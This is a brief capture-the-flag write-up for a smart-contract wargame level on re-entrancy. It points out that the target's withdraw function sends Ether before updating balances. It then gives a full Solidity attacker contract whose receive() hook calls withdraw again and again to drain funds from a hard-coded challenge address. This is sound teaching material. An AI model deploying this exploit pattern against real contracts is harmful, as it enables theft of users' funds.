### Level 10: **Re-entrancy**

**Date:** 25-04-2026

**Difficulty:** Easy

### Thinking:

```
function withdraw(uint256 _amount) public {
    if (balances[msg.sender] >= _amount) {
        (bool result,) = msg.sender.call{value: _amount}("");
        if (result) {
            _amount;
        }
        balances[msg.sender] -= _amount;
    }
}

```

-   Again, the `withdraw` function performs the external transaction before updating its internal state.
-   We can take advantage of this mistake by preparing a contract for a re-entrancy attack.

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

interface IReentrance  {
    function donate(address _to) external   payable;
    function withdraw(uint _amount) external ;
}

contract HelperContract {
    address  _owner ;
    address  payable constant REENTRANCE = payable(0x51Df634eC613eb27b3E34F2f862BA8D8dA9F0F90);

    modifier onlyOwner() {
        require(msg.sender == _owner, "Not owner");
        _;
    }

    constructor()  {
        _owner = msg.sender;
    }

    function callDonate() external payable {
        IReentrance(REENTRANCE).donate{value: msg.value}(address(this));
    }

    function callWithdraw() public onlyOwner{
        IReentrance(REENTRANCE).withdraw(0.001 ether); // start withdraw from here
    }

		// Rentrance happened here!!!
    receive() external payable {
        IReentrance(REENTRANCE).withdraw(0.001 ether);
    }
}

```